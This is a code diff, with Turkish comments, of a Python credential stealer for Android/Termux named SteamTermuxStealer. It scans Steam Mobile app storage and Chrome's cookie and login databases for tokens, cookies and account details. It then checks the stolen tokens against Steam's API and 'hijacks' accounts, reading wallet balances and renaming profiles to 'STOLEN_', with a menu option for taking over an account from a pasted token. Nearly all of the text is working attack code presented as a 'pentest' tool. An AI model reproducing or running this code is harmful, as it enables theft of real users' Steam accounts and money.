@@ -19,62 +19,37 @@ from datetime import datetime
 from urllib.parse import urlparse, parse_qs
 
 # ============================================================
-# KONFIGURASYON
+# KONFIGURASYON - Global degiskenler
 # ============================================================
 
-OUTPUT_DIR = "/sdcard/steam_pentest"
-STEAM_API = "https://api.steampowered.com"
-STEAM_COMMUNITY = "https://steamcommunity.com"
-STEAM_STORE = "https://store.steampowered.com"
+G_OUTPUT_DIR = "/sdcard/steam_pentest"
+G_STEAM_API = "https://api.steampowered.com"
+G_STEAM_COMMUNITY = "https://steamcommunity.com"
+G_STEAM_STORE = "https://store.steampowered.com"
 
-USER_AGENTS = [
+G_USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
     "Mozilla/5.0 (Android 14; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0",
 ]
 
-# ============================================================
-# STEAM MOBILE VERITABANI YOLLARI (TERMUX)
-# ============================================================
-
-STEAM_MOBILE_PATHS = [
-    # Ana yol - Steam Mobile uygulamasi
+# Steam Mobile veritabani yollari
+G_STEAM_MOBILE_PATHS = [
     "/data/data/com.valvesoftware.android.steam.community/",
     "/data/data/com.valvesoftware.android.steam.community/databases/",
     "/data/data/com.valvesoftware.android.steam.community/shared_prefs/",
     "/data/data/com.valvesoftware.android.steam.community/files/",
-    
-    # SDCard yedekleri
     "/sdcard/Android/data/com.valvesoftware.android.steam.community/",
     "/sdcard/Android/data/com.valvesoftware.android.steam.community/files/",
     "/sdcard/Android/obb/com.valvesoftware.android.steam.community/",
-    
-    # Internal storage
     "/storage/emulated/0/Android/data/com.valvesoftware.android.steam.community/",
     "/storage/emulated/0/Android/data/com.valvesoftware.android.steam.community/files/",
-    
-    # Steam Web (Chrome custom tab)
     "/data/data/com.android.chrome/app_chrome/Default/Cookies",
     "/data/data/com.android.chrome/app_chrome/Default/Login Data",
     "/data/data/com.android.chrome/app_chrome/Default/Web Data",
-    
-    # Termux local
     "/data/data/com.termux/files/home/.steam/",
     "/data/data/com.termux/files/home/.config/steam/",
 ]
-
-# Steam veritabani tablolari ve sorgulari
-STEAM_DB_QUERIES = {
-    "accounts": "SELECT * FROM accounts",
-    "users": "SELECT * FROM users",
-    "sessions": "SELECT * FROM sessions",
-    "tokens": "SELECT * FROM tokens",
-    "auth": "SELECT * FROM auth",
-    "credentials": "SELECT * FROM credentials",
-    "login": "SELECT * FROM login",
-    "cookies": "SELECT * FROM cookies",
-    "preferences": "SELECT * FROM preferences",
-}
 
 
 class SteamTermuxStealer:
@@ -83,7 +58,7 @@ class SteamTermuxStealer:
     def __init__(self):
         self.session = requests.Session()
         self.session.headers.update({
-            "User-Agent": random.choice(USER_AGENTS),
+            "User-Agent": random.choice(G_USER_AGENTS),
         })
         
         self.found_accounts = []
@@ -92,13 +67,16 @@ class SteamTermuxStealer:
         self.found_credentials = []
         self.found_databases = []
         
-        # Output dizini
-        if not os.path.exists(OUTPUT_DIR):
+        # Output dizini - GLOBAL degiskeni kullan
+        global G_OUTPUT_DIR
+        self.output_dir = G_OUTPUT_DIR
+        
+        if not os.path.exists(self.output_dir):
             try:
-                os.makedirs(OUTPUT_DIR)
+                os.makedirs(self.output_dir)
             except:
-                OUTPUT_DIR = os.path.expanduser("~/steam_pentest")
-                os.makedirs(OUTPUT_DIR, exist_ok=True)
+                self.output_dir = os.path.expanduser("~/steam_pentest")
+                os.makedirs(self.output_dir, exist_ok=True)
     
     # ============================================================
     # 1. STEAM MOBILE VERITABANI TARAMA
@@ -144,49 +122,46 @@ class SteamTermuxStealer:
     def scan_steam_databases(self):
         """Steam Mobile SQLite veritabanlarini tara"""
         
-        for base_path in STEAM_MOBILE_PATHS:
+        for base_path in G_STEAM_MOBILE_PATHS:
             if not os.path.exists(base_path):
                 continue
             
             print(f"  [*] Taranıyor: {base_path}")
             
-            # .db ve .sqlite dosyalarini bul
-            for root, dirs, files in os.walk(base_path):
-                for file in files:
-                    if file.endswith((".db", ".sqlite", ".sqlite3")):
-                        db_path = os.path.join(root, file)
-                        self._analyze_database(db_path)
-                    
-                    # JSON dosyalari
-                    elif file.endswith(".json"):
-                        json_path = os.path.join(root, file)
-                        self._analyze_json(json_path)
-                    
-                    # Config dosyalari
-                    elif file.endswith((".xml", ".conf", ".cfg", ".txt")):
-                        text_path = os.path.join(root, file)
-                        self._analyze_text(text_path)
+            try:
+                for root, dirs, files in os.walk(base_path):
+                    for file in files:
+                        if file.endswith((".db", ".sqlite", ".sqlite3")):
+                            db_path = os.path.join(root, file)
+                            self._analyze_database(db_path)
+                        
+                        elif file.endswith(".json"):
+                            json_path = os.path.join(root, file)
+                            self._analyze_json(json_path)
+                        
+                        elif file.endswith((".xml", ".conf", ".cfg", ".txt")):
+                            text_path = os.path.join(root, file)
+                            self._analyze_text(text_path)
+            except Exception as e:
+                pass
     
     def _analyze_database(self, db_path):
         """SQLite veritabanini analiz et"""
         try:
-            # Dosyayi kopyala (kilitli olabilir)
-            temp_path = f"/data/data/com.termux/files/home/.temp_steam.db"
+            temp_path = "/data/data/com.termux/files/home/.temp_steam.db"
             shutil.copy2(db_path, temp_path)
             
             conn = sqlite3.connect(temp_path)
             cursor = conn.cursor()
             
-            # Tablolari listele
             cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
             tables = cursor.fetchall()
             
             if tables:
-                print(f"    [+] Veritabani: {db_path}")
+                print(f"    [+] Veritabani: {os.path.basename(db_path)}")
                 print(f"       Tablolar: {len(tables)}")
                 self.found_databases.append(db_path)
                 
-                # Her tabloyu kontrol et
                 for table in tables:
                     table_name = table[0]
                     try:
@@ -194,26 +169,21 @@ class SteamTermuxStealer:
                         columns = cursor.fetchall()
                         col_names = [c[1] for c in columns]
                         
-                        # Steam ile ilgili kolonlar
                         steam_keywords = ["token", "session", "login", "password", "auth", 
                                          "credential", "cookie", "steam", "account", "user",
                                          "key", "secret", "refresh", "access"]
                         
                         if any(k in " ".join(col_names).lower() for k in steam_keywords):
-                            # Verileri al
                             cursor.execute(f"SELECT * FROM {table_name} LIMIT 50;")
                             rows = cursor.fetchall()
                             
                             if rows:
                                 print(f"       [!] Tablo '{table_name}' STEAM VERISI ICERIYOR!")
-                                print(f"           Kolonlar: {col_names}")
                                 print(f"           Kayit: {len(rows)}")
                                 
-                                # Verileri analiz et
                                 for row in rows:
                                     row_data = dict(zip(col_names, row))
                                     self._extract_steam_data(row_data, db_path, table_name)
-                                    
                     except Exception:
                         pass
             
@@ -232,7 +202,6 @@ class SteamTermuxStealer:
                 
             value_str = str(value)
             
-            # Access Token (JWT)
             if any(k in key.lower() for k in ["token", "access", "jwt", "bearer"]):
                 if len(value_str) > 50 and value_str.startswith("eyJ"):
                     self.found_tokens.append({
@@ -240,9 +209,8 @@ class SteamTermuxStealer:
                         "source": source,
                         "type": "access_token"
                     })
-                    print(f"           [TOKEN] Access Token bulundu: {value_str[:40]}...")
+                    print(f"           [TOKEN] Access Token: {value_str[:40]}...")
             
-            # Refresh Token
             elif any(k in key.lower() for k in ["refresh", "rtoken"]):
                 if len(value_str) > 30:
                     self.found_tokens.append({
@@ -252,7 +220,6 @@ class SteamTermuxStealer:
                     })
                     print(f"           [TOKEN] Refresh Token: {value_str[:30]}...")
             
-            # Steam ID
             elif any(k in key.lower() for k in ["steamid", "steam_id", "sid"]):
                 if value_str.isdigit() and len(value_str) == 17:
                     self.found_accounts.append({
@@ -262,7 +229,6 @@ class SteamTermuxStealer:
                     })
                     print(f"           [ACCOUNT] SteamID: {value_str}")
             
-            # Kullanici adi / email
             elif any(k in key.lower() for k in ["email", "username", "account", "login"]):
                 if "@" in value_str or len(value_str) > 3:
                     self.found_credentials.append({
@@ -272,11 +238,28 @@ class SteamTermuxStealer:
                     })
                     print(f"           [CRED] {key}: {value_str}")
             
-            # Cookie
             elif "cookie" in key.lower():
                 if "steamLogin" in value_str or "sessionid" in value_str:
                     self.found_cookies[source] = value_str
                     print(f"           [COOKIE] Steam cookie: {value_str[:50]}...")
+    
+    def _analyze_json(self, json_path):
+        """JSON dosyasini analiz et"""
+        try:
+            with open(json_path, "r", errors="ignore") as f:
+                content = f.read()
+                self._extract_tokens_from_text(content, json_path)
+        except:
+            pass
+    
+    def _analyze_text(self, text_path):
+        """Metin dosyasini analiz et"""
+        try:
+            with open(text_path, "r", errors="ignore") as f:
+                content = f.read()
+                self._extract_tokens_from_text(content, text_path)
+        except:
+            pass
     
     def scan_shared_prefs(self):
         """Shared Preferences XML dosyalarini tara"""
@@ -290,42 +273,42 @@ class SteamTermuxStealer:
             if not os.path.exists(pref_path):
                 continue
             
-            for file in os.listdir(pref_path):
-                if file.endswith(".xml"):
-                    filepath = os.path.join(pref_path, file)
-                    try:
-                        with open(filepath, "r", errors="ignore") as f:
-                            content = f.read()
-                        
-                        # Steam anahtarlari
-                        patterns = [
-                            r'<string name="([^"]+)">([^<]+)</string>',
-                            r'name="([^"]+)"\s*value="([^"]+)"',
-                            r'"([^"]+)"\s*:\s*"([^"]+)"',
-                        ]
-                        
-                        for pattern in patterns:
-                            matches = re.findall(pattern, content)
-                            for key, value in matches:
-                                key_lower = key.lower()
-                                
-                                if any(k in key_lower for k in ["token", "steam", "password", "auth", "login", "key"]):
-                                    print(f"    [+] {file}: {key} = {value[:40]}...")
+            try:
+                for file in os.listdir(pref_path):
+                    if file.endswith(".xml"):
+                        filepath = os.path.join(pref_path, file)
+                        try:
+                            with open(filepath, "r", errors="ignore") as f:
+                                content = f.read()
+                            
+                            patterns = [
+                                r'<string name="([^"]+)">([^<]+)</string>',
+                                r'name="([^"]+)"\s*value="([^"]+)"',
+                            ]
+                            
+                            for pattern in patterns:
+                                matches = re.findall(pattern, content)
+                                for key, value in matches:
+                                    key_lower = key.lower()
                                     
-                                    if "token" in key_lower and len(value) > 50:
-                                        self.found_tokens.append({
-                                            "token": value,
-                                            "source": filepath,
-                                            "type": "pref_token"
-                                        })
-                                    elif "steamid" in key_lower:
-                                        self.found_accounts.append({
-                                            "steamid": value,
-                                            "source": filepath
-                                        })
-                    
-                    except Exception:
-                        pass
+                                    if any(k in key_lower for k in ["token", "steam", "password", "auth", "login", "key"]):
+                                        print(f"    [+] {file}: {key} = {value[:40]}...")
+                                        
+                                        if "token" in key_lower and len(value) > 50:
+                                            self.found_tokens.append({
+                                                "token": value,
+                                                "source": filepath,
+                                                "type": "pref_token"
+                                            })
+                                        elif "steamid" in key_lower:
+                                            self.found_accounts.append({
+                                                "steamid": value,
+                                                "source": filepath
+                                            })
+                        except:
+                            pass
+            except:
+                pass
     
     def scan_filesystem(self):
         """Dosya sisteminde token ara"""
@@ -337,12 +320,8 @@ class SteamTermuxStealer:
             "/sdcard/Documents/",
         ]
         
-        # Aranacak dosya adlari
-        target_files = [
-            "steam", "token", "login", "auth", "cookie", "account",
-            "credential", "password", "session", "api_key", "secret",
-            "config", "settings", "profile", "user_data"
-        ]
+        target_keywords = ["steam", "token", "login", "auth", "cookie", "account",
+                          "credential", "password", "session", "api_key", "secret"]
         
         for base_path in search_paths:
             if not os.path.exists(base_path):
@@ -351,25 +330,20 @@ class SteamTermuxStealer:
             try:
                 for root, dirs, files in os.walk(base_path):
                     for file in files:
-                        # Sadece certain dosya tipleri
-                        if any(file.lower().startswith(t) for t in target_files):
+                        if any(kw in file.lower() for kw in target_keywords):
                             filepath = os.path.join(root, file)
                             try:
                                 with open(filepath, "r", errors="ignore") as f:
                                     content = f.read()
-                                
-                                # Token pattern
                                 self._extract_tokens_from_text(content, filepath)
-                                
-                            except Exception:
+                            except:
                                 pass
-            except Exception:
+            except:
                 pass
     
     def _extract_tokens_from_text(self, text, source):
         """Metin icinden token'lari cikar"""
         
-        # JWT token
         jwt_pattern = r'eyJ[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]+'
         for match in re.findall(jwt_pattern, text):
             if len(match) > 100:
@@ -380,7 +354,6 @@ class SteamTermuxStealer:
                 })
                 print(f"    [TOKEN] JWT: {match[:30]}...")
         
-        # Steam refresh token
         refresh_pattern = r'(access_token|refresh_token)=([a-zA-Z0-9_\-%]+)'
         for match in re.findall(refresh_pattern, text, re.IGNORECASE):
             if len(match[1]) > 40:
@@ -391,7 +364,6 @@ class SteamTermuxStealer:
                 })
                 print(f"    [TOKEN] {match[0]}: {match[1][:30]}...")
         
-        # Steam login cookie
         cookie_pattern = r'steamLogin=([a-zA-Z0-9%]+)'
         for match in re.findall(cookie_pattern, text):
             self.found_cookies[source] = f"steamLogin={match}"
@@ -417,14 +389,13 @@ class SteamTermuxStealer:
                 conn = sqlite3.connect(temp_path)
                 cursor = conn.cursor()
                 
-                # Cookies tablosu
                 try:
-                    cursor.execute("SELECT host_key, name, value, encrypted_value FROM cookies WHERE host_key LIKE '%steam%' OR host_key LIKE '%steampowered%';")
+                    cursor.execute("SELECT host_key, name, value FROM cookies WHERE (host_key LIKE '%steam%' OR host_key LIKE '%steampowered%') AND (name = 'steamLogin' OR name = 'steamID' OR name = 'sessionid' OR name = 'steamLoginSecure');")
                     rows = cursor.fetchall()
                     
                     for row in rows:
-                        host, name, value, enc = row
-                        if name in ["steamLogin", "steamID", "sessionid", "steamLoginSecure"]:
+                        host, name, value = row
+                        if value:
                             self.found_cookies[f"{host}/{name}"] = value
                             print(f"    [COOKIE] Chrome: {host} -> {name} = {value[:30]}...")
                 
@@ -442,15 +413,13 @@ class SteamTermuxStealer:
         
         print("\n[*] Token analizi baslatiliyor...")
         
-        for token_entry in self.found_tokens[:10]:  # Ilk 10 token
+        for token_entry in self.found_tokens[:10]:
             token = token_entry["token"]
             
-            # JWT decode dene
             try:
                 parts = token.split(".")
                 if len(parts) == 3:
                     payload_b64 = parts[1]
-                    # Padding ekle
                     payload_b64 += "=" * (4 - len(payload_b64) % 4)
                     payload = base64.b64decode(payload_b64)
                     payload_data = json.loads(payload)
@@ -459,13 +428,12 @@ class SteamTermuxStealer:
                     if steam_id:
                         print(f"\n  [*] Token test ediliyor: SteamID={steam_id}")
                         
-                        # Token'i dene
                         test_session = requests.Session()
                         test_session.headers["Authorization"] = f"Bearer {token}"
                         
                         try:
                             res = test_session.post(
-                                f"{STEAM_API}/IPlayerService/GetSteamLevel/v1/",
+                                f"{G_STEAM_API}/IPlayerService/GetSteamLevel/v1/",
                                 data={"access_token": token, "steamid": steam_id},
                                 timeout=10
                             )
@@ -473,8 +441,6 @@ class SteamTermuxStealer:
                             if res.status_code == 200:
                                 level = res.json().get("response", {}).get("player_level", 0)
                                 print(f"    [+] TOKEN GECERLI! Level: {level}")
-                                
-                                # Hesabi ele gecir
                                 self.hijack_account(steam_id, token)
                                 
                         except Exception as e:
@@ -507,7 +473,7 @@ class SteamTermuxStealer:
         # Profil bilgisi
         try:
             prof = hijack_session.get(
-                f"{STEAM_API}/ISteamUser/GetPlayerSummaries/v2/",
+                f"{G_STEAM_API}/ISteamUser/GetPlayerSummaries/v2/",
                 params={"key": "", "steamids": steam_id},
                 headers={"Authorization": f"Bearer {access_token}"},
                 timeout=10
@@ -519,13 +485,13 @@ class SteamTermuxStealer:
                     stolen["username"] = p.get("personaname")
                     stolen["profile_url"] = p.get("profileurl")
                     print(f"    [+] Kullanici: {stolen['username']}")
-        except Exception:
+        except:
             pass
         
         # Cuzdan
         try:
             wallet = hijack_session.get(
-                f"{STEAM_STORE}/api/getwalletinfoofuser/",
+                f"{G_STEAM_STORE}/api/getwalletinfoofuser/",
                 params={"access_token": access_token},
                 timeout=10
             )
@@ -534,13 +500,13 @@ class SteamTermuxStealer:
                 stolen["balance"] = w.get("wallet_balance", 0) / 100
                 stolen["currency"] = w.get("wallet_currency", "")
                 print(f"    [+] Bakiye: {stolen['balance']} {stolen['currency']}")
-        except Exception:
+        except:
             pass
         
         # Badge/Level
         try:
             badge = hijack_session.post(
-                f"{STEAM_API}/IPlayerService/GetBadges/v1/",
+                f"{G_STEAM_API}/IPlayerService/GetBadges/v1/",
                 data={"access_token": access_token, "steamid": steam_id},
                 timeout=10
             )
@@ -550,7 +516,7 @@ class SteamTermuxStealer:
                 stolen["xp"] = b.get("player_xp", 0)
                 stolen["badge_count"] = len(b.get("badges", []))
                 print(f"    [+] Seviye: {stolen['level']} | Rozet: {stolen['badge_count']}")
-        except Exception:
+        except:
             pass
         
         # Profil takeover
@@ -558,7 +524,7 @@ class SteamTermuxStealer:
         try:
             new_name = f"STOLEN_{random.randint(1000,9999)}"
             takeover = hijack_session.post(
-                f"{STEAM_API}/ISteamUser/UpdateProfile/v1/",
+                f"{G_STEAM_API}/ISteamUser/UpdateProfile/v1/",
                 data={
                     "access_token": access_token,
                     "steamid": steam_id,
@@ -572,7 +538,7 @@ class SteamTermuxStealer:
                 stolen["profile_takeover"] = True
                 stolen["new_name"] = new_name
                 print(f"    [+] PROFIL DEGISTIRILDI! Yeni isim: {new_name}")
-        except Exception:
+        except:
             pass
         
         self.found_accounts.append(stolen)
@@ -583,7 +549,7 @@ class SteamTermuxStealer:
     def _save_account(self, data):
         """Ele gecirilen hesabi kaydet"""
         ts = datetime.now().strftime("%Y%m%d_%H%M%S")
-        filename = f"{OUTPUT_DIR}/stolen_{data['steam_id']}_{ts}.json"
+        filename = f"{self.output_dir}/stolen_{data['steam_id']}_{ts}.json"
         
         with open(filename, "w") as f:
             json.dump(data, f, indent=2, default=str)
@@ -607,7 +573,6 @@ class SteamTermuxStealer:
                 "cookies_found": len(self.found_cookies),
                 "credentials_found": len(self.found_credentials),
             },
-            "databases": self.found_databases[:20],
             "accounts": [{
                 "steamid": a.get("steamid"),
                 "username": a.get("username", "N/A"),
@@ -619,10 +584,9 @@ class SteamTermuxStealer:
                 "type": t.get("type"),
                 "preview": t["token"][:30] + "..."
             } for t in self.found_tokens[:20]],
-            "cookies": list(self.found_cookies.keys())[:20],
         }
         
-        filename = f"{OUTPUT_DIR}/report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
+        filename = f"{self.output_dir}/report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
         with open(filename, "w") as f:
             json.dump(report, f, indent=2)
         
@@ -648,14 +612,13 @@ def show_banner():
 def main():
     stealer = SteamTermuxStealer()
     
-    # Root kontrol
     root_access = os.geteuid() == 0 if hasattr(os, 'geteuid') else False
     
     while True:
         show_banner()
         
         print("\nRoot yetkisi:", "VAR" if root_access else "YOK (sinirli)")
-        print("Output:", OUTPUT_DIR)
+        print("Output:", stealer.output_dir)
         print("\n[1] TAM TARAMA BASLAT (Tumunu Tara)")
         print("[2] Sadece Steam Mobile DB Tara")
         print("[3] Sadece Dosya Sistemi Tara")
@@ -669,8 +632,7 @@ def main():
         choice = input("\nSecim: ").strip()
         
         if choice == "1":
-            print("\n[!] Tam tarama baslatiliyor... (Bu biraz surebilir)")
-            print("[!] Root yetkisi varsa daha fazla veri bulunabilir")
+            print("\n[!] Tam tarama baslatiliyor...")
             
             if input("\nDevam? (E/H): ").strip().upper() == "E":
                 results = stealer.scan_all()
@@ -684,11 +646,6 @@ def main():
                 print(f"  Cookie: {results['cookies']}")
                 print(f"  Kimlik: {results['credentials']}")
                 print("="*60)
-                
-                if results['accounts'] > 0:
-                    print("\n[!] Hesaplar ele gecirildi ve kaydedildi!")
-                if results['tokens'] > 0:
-                    print("[!] Token'lar test edildi!")
             
             input("\nDevam etmek icin Enter...")
         
@@ -714,7 +671,7 @@ def main():
         elif choice == "6":
             print("\n[*] Manuel Token ile Hesap Ele Gecir")
             token = input("Access Token: ").strip()
-            steam_id = input("SteamID64: ").strip() or "76561197960265728"
+            steam_id = input("SteamID64 (bos=birak): ").strip() or "76561197960265728"
             
             if token:
                 stealer.hijack_account(steam_id, token)
@@ -724,7 +681,7 @@ def main():
             print("\n=== SONUCLAR ===")
             print(f"\nVeritabani: {len(stealer.found_databases)}")
             for db in stealer.found_databases[:5]:
-                print(f"  - {db}")
+                print(f"  - {os.path.basename(db)}")
             
             print(f"\nHesap: {len(stealer.found_accounts)}")
             for acc in stealer.found_accounts[:5]:
@@ -742,7 +699,7 @@ def main():
         
         elif choice == "0":
             print("\n[*] Cikiliyor...")
-            print(f"[+] Output: {OUTPUT_DIR}/")
+            print(f"[+] Output: {stealer.output_dir}/")
             if stealer.found_accounts:
                 print(f"[+] Ele gecirilen hesap: {len(stealer.found_accounts)}")
             sys.exit(0)
